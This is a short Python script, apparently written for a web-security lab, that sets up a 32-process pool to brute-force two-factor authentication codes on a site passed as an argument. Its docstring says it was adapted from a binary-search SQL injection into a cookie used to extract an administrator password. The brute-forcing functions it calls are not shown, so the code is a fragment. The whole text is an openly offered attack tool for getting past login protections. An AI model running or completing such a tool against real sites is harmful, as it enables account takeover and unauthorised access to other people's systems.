import sys
import requests
from bs4 import BeautifulSoup
from multiprocessing import Pool, Value
from functools import partial
from math import floor, ceil

""" Ben Totten
    Originally a part of a Binary Search using regex to find administrator password using sql injection into a cookie
    Args:
        site (str): URL to test;
    Expected:
        Origingally intended to prints valid 2FA token
"""

# Globals
if(len(sys.argv) > 1):
    site = sys.argv[1]

thread_count = 32   # Number of threads you want to run on
s = requests.Session()
tracker = Value('i', 0)

def main():
  # Allocate number range to check based on number of threads used
  intervals = allocate_boundaries()
  
  # Set up and initiate threading pool
  thread_it = partial(brute_2FA, intervals=intervals, login2_url=site)
  
  # Launch process on threads
  with Pool(thread_count) as p:
    returned_codes = p.map(thread_it, intervals['start'])

